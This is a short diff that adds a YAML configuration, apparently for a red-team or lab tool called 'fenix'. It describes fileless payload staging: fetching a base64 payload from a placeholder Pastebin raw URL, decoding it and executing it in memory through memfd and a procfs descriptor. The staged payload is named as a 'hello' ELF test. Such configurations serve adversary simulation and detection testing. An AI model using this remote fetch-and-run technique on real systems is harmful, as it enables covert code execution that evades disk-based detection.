@@ -1,0 +1,10 @@
+# Remote raw URL staging (Pastebin-style).
+# Option A: fenix run fileless-staging --lab-remote hello-b64
+# Option B: paste payloads/staged/hello_elf.b64 to Pastebin raw, set source_url below
+technique: fileless-staging
+source_url: https://pastebin.com/raw/EXAMPLE
+decode: base64
+decompress: none
+execute: memfd
+name: fenix_staged_payload
+method: procfs-fd
